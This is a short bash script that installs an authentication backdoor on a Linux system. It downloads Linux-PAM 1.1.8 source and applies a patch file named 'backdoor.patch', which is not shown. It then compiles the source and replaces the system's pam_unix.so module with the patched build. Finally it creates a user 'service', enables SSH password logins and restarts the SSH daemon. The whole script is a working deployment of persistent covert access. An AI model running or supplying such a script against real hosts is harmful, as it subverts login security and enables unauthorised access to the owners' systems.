#!/bin/bash

apt install -y make curl patch gcc flex bison
curl http://archive.ubuntu.com/ubuntu/pool/main/p/pam/pam_1.1.8.orig.tar.gz | tar -xzf -
cd Linux-PAM-1.1.8
patch -p1 <../backdoor.patch
./configure
make
cp modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security
useradd -M service
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config 
systemctl restart sshd
